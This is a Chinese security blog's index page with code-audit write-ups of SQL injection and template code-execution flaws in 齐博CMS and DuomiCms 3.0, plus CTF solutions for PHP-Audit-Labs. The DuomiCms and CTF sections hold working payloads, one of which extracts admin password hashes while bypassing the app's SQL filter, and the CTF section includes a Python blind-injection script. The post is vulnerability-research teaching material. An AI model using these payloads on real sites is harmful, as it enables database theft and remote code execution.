<!DOCTYPE html>
<html lang="zh-Hans">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">



  <meta name="description" content="与其哀叹，不如埋头苦干"/>













  <link rel="alternate" href="/atom.xml" title="Mochazz's blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.6.0" />



<link rel="canonical" href="https://mochazz.github.io/"/>








<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.6.0" />



  



  <script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>








<script>
  window.config = {"title":"Mochazz's blog","subtitle":null,"description":"与其哀叹，不如埋头苦干","author":"Mochazz","language":"zh-Hans","timezone":"Asia/Shanghai","url":"https://mochazz.github.io","root":"/","permalink":":year/:month/:day/:title/","permalink_defaults":null,"source_dir":"source","public_dir":"public","tag_dir":"tags","archive_dir":"archives","category_dir":"categories","code_dir":"downloads/code","i18n_dir":":lang","skip_render":null,"new_post_name":":title.md","default_layout":"post","titlecase":false,"external_link":true,"filename_case":0,"render_drafts":false,"post_asset_folder":false,"relative_link":false,"future":true,"highlight":{"enable":true,"auto_detect":false,"line_number":true,"tab_replace":null},"default_category":"uncategorized","category_map":null,"tag_map":null,"date_format":"YYYY-MM-DD","time_format":"HH:mm:ss","per_page":5,"pagination_dir":"page","theme":{"color":"Default","toc":true,"fancybox":true},"deploy":{"type":"git","repo":"https://github.com/Mochazz/Mochazz.github.io.git","branch":"master"},"ignore":[],"index_generator":{"per_page":10,"order_by":"-date","path":""},"archive_generator":{"per_page":20,"yearly":true,"monthly":true,"daily":false,"order_by":"-date"},"category_generator":{"per_page":20},"tag_generator":{"per_page":20},"server":{"port":7555,"log":false,"compress":true,"header":true},"marked":{"gfm":true,"pedantic":false,"sanitize":false,"tables":true,"breaks":true,"smartLists":true,"smartypants":true,"modifyAnchors":"","autolink":true},"since":2017,"favicon":"/favicon.ico","rss":false,"menu":{"首页":"/","归档":"/archives/"},"copyright":{"enable":true,"license":"<a rel=\"license\" href=\"http://creativecommons.org/licenses/by-nc/4.0/\" target=\"_blank\">知识共享署名-非商业性使用 4.0 国际许可协议</a>"},"reward":{"enable":false,"qrCode":{"wechat":null,"alipay":null}},"social":{"email":"379032449@qq.com","stack-overflow":null,"twitter":null,"facebook":null,"linkedin":null,"google":null,"github":"https://github.com/Mochazz/","weibo":null,"zhihu":null,"douban":null,"pocket":null,"tumblr":null,"instagram":null},"baidu_analytics":null,"baidu_verification":null,"google_analytics":null,"google_verification":null,"disqus_shortname":null,"changyan":{"appid":null,"appkey":null},"livere_datauid":null,"version":"2.6.0"};
</script>

    <title> Mochazz's blog </title>
  </head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">Mochazz's blog</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    
      <a href="/">
        <li class="mobile-menu-item">
          
          
            首页
          
        </li>
      </a>
    
      <a href="/archives/">
        <li class="mobile-menu-item">
          
          
            归档
          
        </li>
      </a>
    
  </ul>
</nav>

    <div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">Mochazz's blog</a>
</div>

<nav class="site-navbar">
  
    <ul id="menu" class="menu">
      
        <li class="menu-item">
          <a class="menu-item-link" href="/">
            
            
              首页
            
          </a>
        </li>
      
        <li class="menu-item">
          <a class="menu-item-link" href="/archives/">
            
            
              归档
            
          </a>
        </li>
      
    </ul>
  
</nav>

      </header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content">
            
  <section id="posts" class="posts">
    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/10/04/齐博CMS_V7.0前台SQL注入/">齐博CMS_V7.0前台SQL注入</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-10-04
        </span>
        
          <div class="post-category">
            
              <a href="/categories/代码审计/">代码审计</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天看到一篇文章分析齐博CMS注入的文章：<a href="http://www.gzsec.org/?p=485" target="_blank" rel="noopener">齐博CMS激活验证处SQL注入</a> ，得空分析了一下，总体感觉漏洞利用比较鸡肋。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>实际上齐博CMS是有对变量进行过滤的，但是本次注入点就是利用程序自带的编码，使得这些过滤形同虚设。</p>
<p>注入点在 <strong>inc/class.user.php</strong> 文件中的 <strong>get_passport</strong> 方法，可以清晰的看到SQL语句进行了变量拼接。</p>
<p><img src="/img/齐博CMS_V7.0前台SQL注入/1.png" alt="1"></p>
<p>同个文件的 <strong>get_allInfo</strong> 方法调用了 <strong>get_passport</strong> 。</p>
<p><img src="/img/齐博CMS_V7.0前台SQL注入/2.png" alt="2"></p>
<p>变量加密处的位置在 <strong>do/activate.php</strong> 文件，代码如下：</p>
<p><img src="/img/齐博CMS_V7.0前台SQL注入/3.png" alt="3"></p>
<p>可以看到上图 <strong>第7行</strong> 代码，将经过 <strong>mymd5</strong> 函数解密后的数据直接赋值给 <strong>$username</strong> 和 <strong>$password</strong> 两个变量，并带入数据库查询。解密后的数据没有经过处理，这是导致发生SQL注入的关键。我们可以看看 <strong>mymd5</strong> 函数的代码。</p>
<p><img src="/img/齐博CMS_V7.0前台SQL注入/4.png" alt="4"></p>
<p>可以看到这个函数包含了加密与解密。然而要想利用这个注入点，我们需要知道 <strong>$webdb[mymd5]</strong> 的值，而这个变量的值在每个网站搭建时会有一个初始值，且都不一样，这也是这个漏洞的鸡肋之处。我们可以登录后台查看到该变量对应的值。</p>
<p><img src="/img/齐博CMS_V7.0前台SQL注入/5.png" alt="5"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>要想利用这个漏洞，我们只需要知道 <strong>$webdb[mymd5]</strong> 的值，并将相关函数抽取出来，加密我们的 <strong>payload</strong> 即可。具体如下：</p>
<p><img src="/img/齐博CMS_V7.0前台SQL注入/6.png" alt="6"></p>
<p>然后利用生成的加密字符串构造如下payload，即可成功注入SQL语句：</p>
<p><img src="/img/齐博CMS_V7.0前台SQL注入/7.png" alt="7"></p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>后面想试试通过前台获取 <strong>$webdb[mymd5]</strong> 的值，或者说控制该值，发现都不是很容易，于是作罢。</p>
<p><img src="/img/齐博CMS_V7.0前台SQL注入/8.png" alt="8"></p>

        
      
    </div>

    

    

  </article>

    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/09/30/DuomiCms3.0最新版漏洞挖掘/">DuomiCms3.0最新版漏洞挖掘</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-30
        </span>
        
          <div class="post-category">
            
              <a href="/categories/代码审计/">代码审计</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这篇文章将记录 <strong>DuomiCms3.0最新版</strong> 的漏洞挖掘过程，当中会分享一些审计的技巧，希望对想要学习审计的朋友有所帮助。当中分享的每一个漏洞并不一定都存在，但是为了文章的完整性，还是把所有漏洞挖掘的过程记录下来。</p>
<h3 id="XXE漏洞挖掘"><a href="#XXE漏洞挖掘" class="headerlink" title="XXE漏洞挖掘"></a>XXE漏洞挖掘</h3><p>先使用 <strong>phpstorm</strong> 的全局搜索 <strong>simplexml_load_</strong> 、 <strong>SimpleXMLElement</strong>  等字符串（快捷键为： <code>Ctrl+Shift+F</code> ），这里的 <strong>simplexml_load_</strong> 字符串主要针对 <strong>simplexml_load_file</strong> 和 <strong>simplexml_load_string</strong> 两个函数。我们可以发现搜索结果将近40条，如下：</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/1.png" alt="1"></p>
<p>接下来我们就一个一个进行验证（其实不用真的每个都去验证，因为有的程序代码结构很像，或者看一眼就知道不存在漏洞了）。先来看一下 <strong>api.php</strong> 文件中的代码，可以看到这里的 <strong>XML</strong> 文件内容来自 <strong>$playerKindsfile</strong> 变量，该变量的值为 <strong>data/admin/playerKinds.xml</strong> 文件的内容。 <strong>api.php</strong> 文件代码如下：</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/2.png" alt="2"></p>
<p>这时候，我们要考虑的就是 <strong>data/admin/playerKinds.xml</strong> 文件的内容是否可以被我们控制。如果该文件可以被攻击者控制，就很有可能存在 <strong>XXE</strong> 漏洞。于是，我们搜索字符串 <strong>playerKinds</strong> ，结果如下：</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/3.png" alt="3"></p>
<p>我们发现其中有一个语句为 <strong>\$doc -&gt; save($playerKindsfile)</strong> 。按照函数名来推测，这里极有可能是将 <strong>$playerKindsfile</strong> 变量对应的内容保存进 <strong>data/admin/playerKinds.xml</strong> 文件。所以我们要来看一下 <strong>$playerKindsfile</strong> 变量对应的内容是否可控。</p>
<p>我们找到 <strong>admin\admin_player.php</strong> 文件对应的代码，发现当 <strong>$action==”addnew”</strong> 的时候，会将 <strong>POST</strong> 方式传来的 <strong>playername</strong> 、 <strong>info</strong> 、 <strong>order</strong> 、 <strong>trail</strong> 四个参数写进 <strong>data/admin/playerKinds.xml</strong> 文件。相关代码如下：<br><img src="/img/DuomiCms3.0最新版漏洞挖掘/4.png" alt="4"></p>
<p>我们用 <strong>BurpSuite</strong> 抓包，并用 <strong>TheFolderSpy</strong> 监控 <strong>www</strong> 目录（其目的是检测用户输入是否有被写入文件中），结果如下：</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/5.png" alt="5"></p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/6.png" alt="6"></p>
<p>我们发现 <strong>POST</strong> 方式传输的 <strong>playername</strong> 、 <strong>info</strong> 、 <strong>order</strong> 、 <strong>trail</strong> 四个参数，确实写进了 <strong>data/admin/playerKinds.xml</strong> 文件，但是特殊符号都被 <strong>HTML实体编码</strong> 了，所以这里无法利用。(下图是 <strong>payload</strong> 中特殊字符被 <strong>HTML实体编码</strong> 的截图)。</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/7.png" alt="7"></p>
<p>我们接着看看其他位置是否存在 <strong>XXE</strong> 漏洞，会发现其他地方的 <strong>XML</strong> 文件加载方式基本和上面一样，因此应该不存在 <strong>XXE</strong> 漏洞。</p>
<h3 id="前台代码执行"><a href="#前台代码执行" class="headerlink" title="前台代码执行"></a>前台代码执行</h3><p>这一处的代码执行和以前苹果CMS的代码执行是类似的，都是在解析模板标签的时候，将解析的标签拼接，并用在了 <strong>eval</strong> 函数中，最终造成了代码执行漏洞。</p>
<p>在挖掘漏洞之初，我们先全局搜索 <strong>eval</strong> 函数，这里可以明显的看到只有 <strong>duomiphp\core.class.php</strong> 文件中使用了 <strong>eval</strong> 函数。搜索图如下：</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/8.png" alt="8"></p>
<p>我们详细的看一下其代码，可以发现 <strong>eval</strong> 函数只出现在 <strong>parseIf</strong> 和 <strong>parseSubIf</strong> 函数中：</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/9.png" alt="9"></p>
<p>那么我们就来搜索一下这两个函数在何处被调用。由于 <strong>parseSubIf</strong> 函数在 <strong>parseIf</strong> 函数中被调用，这里我就直接搜索 <strong>parseIf</strong> 函数，并挑选了一个较为简单的 <strong>search.php</strong> 文件进行分析。为了更好分析，我这里直接把 <strong>payload</strong> 带入分析，所使用的 <strong>payload</strong> 如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/search.php?searchword=&#123;if:phpinfo()&#125;phpinfo()&#123;end</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/10.png" alt="10"></p>
<p>下面我们来具体分析 <strong>search.php</strong> 文件。首先文件开头引入了 <strong>duomiphp/common.php</strong> 文件，而该文件引入了 <strong>duomiphp\webscan.php</strong> 文件对用户提交的变量进行处理。该文件使用以下三个正则分别对用户传递的 <strong>GPC</strong> （ <strong>GET、POST、COOKIE</strong> ）参数进行过滤，但是我们的 <strong>payload</strong> 并不会触发这里的正则。</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/11.png" alt="11"></p>
<p>在 <strong>duomiphp/common.php</strong> 文件中，还存在一处变量覆盖的利用点（如下图代码）：</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/12.png" alt="12"></p>
<p>继续回到 <strong>search.php</strong> 文件，我将有用的关键代码简化如下：</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/13.png" alt="13"></p>
<p>这里需要注意，程序会 <strong>只截取20个字符</strong> 作为 <strong>$searchword</strong> （上图第2行），然后在 <strong>第14行</strong> 代码处把模板的 <strong>{duomicms:searchword}</strong> 替换成 <strong>$searchword</strong> 。替换后，又在 <strong>第17</strong> 行开始对模板中的IF语句进行解析。虽然程序有做一些过滤操作，但是都无法有效的避免我们的恶意代码。</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/14.png" alt="14"></p>
<p>我们跟进 <strong>parseIf</strong> 方法。其实这里就是把 <strong>IF标签</strong> 的内容取出来，然后拼接到 <strong>eval</strong> 函数中执行了，这也是漏洞的成因，具体的变量值可以看下图右边墨绿色的字体，这里不再赘述。</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/15.png" alt="15"></p>
<p>测了几个版本，都有影响。当然，前台getshell方式还不止这一种，可以利用前面的变量覆盖，伪造admin身份，最后写入webshell，具体分析之后会在 <strong>[红日安全]代码审计Day14 - 从变量覆盖到获取webshell</strong> 文章中详细分析。</p>
<h3 id="SQL注入漏洞挖掘"><a href="#SQL注入漏洞挖掘" class="headerlink" title="SQL注入漏洞挖掘"></a>SQL注入漏洞挖掘</h3><p>根据 <strong>CNVD</strong> 的漏洞通告：<a href="http://www.cnvd.org.cn/flaw/show/CNVD-2018-05568" target="_blank" rel="noopener">DuomiCms x3.0前台duomiphp/ajax.php文件存在SQL注入漏洞</a> ，我们就直接打开 <strong>duomiphp/ajax.php</strong> 文件，观察其中所有的 <strong>SQL</strong> 语句，可以总结为以下几种类型：</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/16.png" alt="16"></p>
<p>可以看到这里大多数 <strong>SQL</strong> 语句使用了拼接，而拼接用的变量又多数是全局变量，我们在前面的代码执行漏洞中，提到程序有注册变量的行为，这样容易造成变量覆盖。下面，我们来一个个分析这些变量。</p>
<p>首先是 <strong>$id</strong> 变量，拼接在 <strong>SQL</strong> 语句尾巴且没有引号包裹。本来应该是比较好利用的，但是这里开头对 <strong>id</strong> 变量进行了类型判断。这样导致在 <strong>select语句</strong> 中无法再利用，但是我们可以用 <strong>16进制</strong> 编码绕过，将payload的 <strong>16进制</strong> 插入数据库中，形成二次注入。但是我们搜索 <strong>insert语句</strong>  的时候，发现其被单引号包裹，所以无法利用，具体代码如下：</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/17.png" alt="17"></p>
<p>接着是 <strong>$score</strong> 变量，该变量位于 <strong>SQL</strong> 语句中间，这样就要引入注释符，将后面的语句注释掉。但是引入注释符，会触发 <strong>duomiphp/sql.class.php</strong> 文件的SQL检测规则，所以这处也不好利用。具体代码如下：</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/18.png" alt="18"></p>
<p>最后剩下一个 <strong>$uid</strong> 变量了，该变量为全局变量，可以由用户控制，而且其位置在SQL语句最后，两边也没有引号包裹，极其好利用。如下图 <strong>第12行</strong> 代码：</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/19.png" alt="19"></p>
<p>我们根据代码逻辑，即可构造出如下 <strong>payload</strong> ：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ajax.php?action=addfav&amp;id=<span class="number">1</span>&amp;uid=<span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat_ws(<span class="number">0x3A</span>,<span class="number">0x3A</span>,version()))</span><br></pre></td></tr></table></figure>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/20.png" alt="20"></p>
<p>但是要想爆出有用的数据，这里还要绕过 <strong>duomiphp/sql.class.php</strong> 文件的SQL检测规则以及全局变量的 <strong>_RunMagicQuotes</strong> 函数的转义。这里直接给出我测试成功的 <strong>payload</strong> ：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost//duomiphp/ajax.php?action=addfav&amp;id=1&amp;uid=10101 and `'`.``.vid and extractvalue(1,concat_ws(0x3A,0x3A,(select`password` from`duomi_admin` limit 1))) and `'`.``.vid</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/21.png" alt="21"></p>
<p>下面，我们直接将 <strong>payload</strong> 带入到程序中进行分析。首先，我们的 <strong>payload</strong> 完美绕过了 <strong>duomiphp/webscan.php</strong> 文件的 <strong>$getfilter</strong> 规则，然后经过了 <strong>duomiphp/common.php</strong> 文件 <strong>_RunMagicQuotes</strong> 函数的转义并注册成全局变量。具体代码如下：</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/22.png" alt="22"></p>
<p>此时 <strong>$uid</strong> 的值已经变成了下面这样：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10101</span> <span class="keyword">and</span> `\<span class="string">'`.``.vid and extractvalue(1,concat_ws(0x3A,0x3A,(select`password` from`duomi_admin` limit 1))) and `\'`.``.vid</span></span><br></pre></td></tr></table></figure>
<p>根据我们传入的 <strong>action=addf</strong> ，我们直接进入了 <strong>duomiphp\ajax.php</strong> 文件的 <strong>addfav</strong> 方法。然后直接拼接SQL语句，进入 <strong>duomiphp\sql.class.php</strong> 文件的 <strong>GetOne</strong> 方法。接着在 <strong>GetOne</strong> 方法中调用了 <strong>$this-&gt;Execute(“one”);</strong> （下图第22行）这段代码。</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/23.png" alt="23"></p>
<p>在 <strong>Execute</strong> 方法中，我们最需要关注的就是 <strong>CheckSql</strong> 方法的实现。首先，如果是 <strong>select</strong> 语句，会先经过下面的正则，这个正则不允许我们使用联合查询。</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/24.png" alt="24"></p>
<p>接着往下看，会发现一个很明显的问题。<strong>while</strong> 语句将处理后的数据库查询语句 <strong>$db_string</strong> 存在 <strong>$clean</strong> 中，然后用于检测的是 <strong>$clean</strong> 变量，最后返回的却是 <strong>$db_string</strong> 。所以我们只要在 <strong>$clean</strong> 变量中不出现敏感词，即可绕过SQL语句的检测。</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/25.png" alt="25"></p>
<p>我们来具体看一下 <strong>while</strong> 中的程序。该函数会先搜索第一个单引号的下标，取引号前面的字符串给 <strong>$clean</strong> ，然后将第一个引号和第二个引号之间的字符用 <strong>$s$</strong> 来代替，最后取第二个引号之后的内容给 <strong>$clean</strong> 变量。</p>
<p><img src="/img/DuomiCms3.0最新版漏洞挖掘/26.png" alt="26"></p>
<p>处理后获得的 <strong>$clean</strong> （如下）可以绕过下面的 <strong>SQL</strong> 检测，然后程序又将 <strong>$db_string</strong> 原样返回，此时也就造成了SQL注入。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $clean</span></span><br><span class="line">select id from `duomi_favorite` where vid=<span class="number">1</span> <span class="keyword">and</span> uid=<span class="number">10101</span> <span class="keyword">and</span> `\$s$`.``.vid</span><br><span class="line"><span class="comment">// $db_string    </span></span><br><span class="line">Select id From `duomi_favorite` where vid=<span class="number">1</span> <span class="keyword">and</span> uid=<span class="number">10101</span> <span class="keyword">and</span> `\<span class="string">'`.``.vid and extractvalue(1,concat_ws(0x3A,0x3A,(select`password` from`duomi_admin` limit 1))) and `\'`.``.vid</span></span><br></pre></td></tr></table></figure>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>实际上，这个CMS在CNVD上通告的漏洞还是蛮多的，虽然没有漏洞详情，但是我们也可以自己审计或者根据描述细节来还原漏洞，从而提高自身的审计能力。在审计某一cms的时候，可以先在CVE、CNVD、seebug上搜搜，了解一下历史漏洞，然后在进行审计，或许会有意外之喜：）</p>
<p><a href="http://www.cnvd.org.cn" target="_blank" rel="noopener">http://www.cnvd.org.cn</a></p>
<p><a href="https://www.seebug.org/search/?keywords=Duomicms" target="_blank" rel="noopener">https://www.seebug.org/search/?keywords=Duomicms</a></p>
<p><a href="http://cve.mitre.org" target="_blank" rel="noopener">http://cve.mitre.org</a></p>

        
      
    </div>

    

    

  </article>

    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/09/30/PHP-Audit-Labs题解之Day9-12/">PHP-Audit-Labs题解之Day9-12</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-30
        </span>
        
          <div class="post-category">
            
              <a href="/categories/代码审计/">代码审计</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大家好，我们是红日安全-代码审计小组。最近我们小组正在做一个PHP代码审计的项目，供大家学习交流，我们给这个项目起了一个名字叫 <a href="https://github.com/hongriSec/PHP-Audit-Labs" target="_blank" rel="noopener"> <strong>PHP-Audit-Labs</strong> </a> 。在每篇文章的最后，我们都留了一道CTF题目，供大家练习。下面是 <strong>Day9-Day12</strong> 的题解：</p>
<h2 id="Day9题解：-By-七月火"><a href="#Day9题解：-By-七月火" class="headerlink" title="Day9题解：(By 七月火)"></a>Day9题解：(By 七月火)</h2><p>题目如下：</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/1.png" alt="1"></p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/2.png" alt="2"></p>
<p>实际上这题是以齐博CMS的漏洞为原型改造的，让我们具体来看一下漏洞是如何产生的。题目提供了一个留言版功能，并且对用户提交的留言进行 <strong>HTML实体编码转换</strong> 、 <strong>特殊字符转义</strong> 、 <strong>违禁词过滤</strong> 等处理，然后直接与sql语句进行拼接操作(下图第5行)，具体代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/3.png" alt="3"></p>
<p>这些转换函数都可以在 <strong>function.php</strong> 文件中找到，我们很明显可以看到在第16-19行处进行了全局变量注册，这样就很容易引发变量覆盖问题。在第14行处定义了需要替换的违禁词数组，并在 <strong>replace_bad_word</strong> 函数中进行替换。这里，我们便可以通过覆盖 <strong>$limit_words</strong> 数组，来逃逸单引号，因为在 <strong>index.php</strong> 文件中使用了 <strong>addslashes</strong> 函数。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/2.png" alt="4"></p>
<p>我们使用第一个 <strong>payload</strong> 如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg=1%00<span class="string">' and updatexml(1,concat(0x7e,(select * from flag),0x7e),1))#&amp;limit_words[\0\]=</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/4.png" alt="5"></p>
<p>这样我们便注出了flag，但是这里的flag并不齐全，因为 <strong>updatexml报错</strong> 最多只能显示 <strong>32位</strong> ，所以下面我使用 <strong>reverse</strong> 函数注出尾部数据。当然方法不止这一种，大家自己举一反三。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg=1%00<span class="string">' and updatexml(1,concat(0x7e,(select reverse(flag) from flag),0x7e),1))#&amp;limit_words[\0\]=</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/5.png" alt="6"></p>
<h2 id="Day10题解：-By-七月火"><a href="#Day10题解：-By-七月火" class="headerlink" title="Day10题解：(By 七月火)"></a>Day10题解：(By 七月火)</h2><p>题目如下：</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/6.png" alt="7"></p>
<p>本次题目源于某CMS <strong>0day</strong> 漏洞改编。很明显可以看到在上图代码 <strong>第29行</strong> 处进行了 <strong>SQL</strong> 语句拼接，然后直接带入数据库查询。而在前一行，其实是有对 <strong>GET</strong> 方式传来的参数 <strong>id</strong> 进行过滤的，我们来详细看看过滤函数 <strong>stophack</strong> 。</p>
<p>我们可以清楚的看到 <strong>stophack</strong> 函数存在 <strong>过滤不严</strong> 和 <strong>检测到非法字符未直接退出</strong> 两个问题。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/7.png" alt="8"></p>
<p>程序如果检测到非法字符或单词，都会将其替换成字符串 <strong>HongRi</strong> ，然而并没有立即退出，这样攻击者输入的攻击语句还是会继续被带入数据库查询。只不过这里关键词都被替换成了字符串 <strong>HongRi</strong> ，所以我们需要绕过这里的黑名单。纵观整个程序，当 <strong>SQL</strong> 语句执行出错时，并不会将错误信息显示出来，所以此处应为盲注。开发者估计也是考虑到这个问题，便将关键词 <strong>sleep</strong> 给过滤了，然而这并不能影响攻击者继续使用盲注来获取数据。关于禁用了 <strong>sleep</strong> 函数的盲注，大家可以直接参考这篇文章：<a href="https://xz.aliyun.com/t/2288" target="_blank" rel="noopener">mysql 延时注入新思路</a> 。这里我直接利用 <strong>benchmark</strong> 函数来获取flag。python程序如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, string, requests</span><br><span class="line"></span><br><span class="line">version_chars = <span class="string">".-&#123;&#125;_"</span> + string.ascii_letters + string.digits + <span class="string">'#'</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> version_chars:</span><br><span class="line">        payload = <span class="string">"-1 or if(ascii(mid((select flag from flag),%s,1))=%s,benchmark(200000000,7^3^8),0)"</span> % (i,ord(char))</span><br><span class="line">        url = <span class="string">"http://localhost/index.php?id=%s"</span> % payload</span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">'#'</span>:</span><br><span class="line">            <span class="keyword">if</span>(flag):</span><br><span class="line">                sys.stdout.write(<span class="string">"\n[+] The flag is： %s"</span> % flag)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"[-] Something run error!"</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url=url, timeout=<span class="number">2.0</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            flag += char</span><br><span class="line">            sys.stdout.write(<span class="string">"\r[-] Try to get flag： %s"</span> % flag)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"[-] Something run error!"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/8.png" alt="9"></p>
<h2 id="Day11题解：-By-licong"><a href="#Day11题解：-By-licong" class="headerlink" title="Day11题解：(By licong)"></a>Day11题解：(By licong)</h2><p>这道题主要考察对php反序列化函数的利用，以及常见的绕过方法。</p>
<p><img src="/img/PHP-Audit-Labs/PHP-Audit-Labs题解/Day9-12/9.png" alt="1"></p>
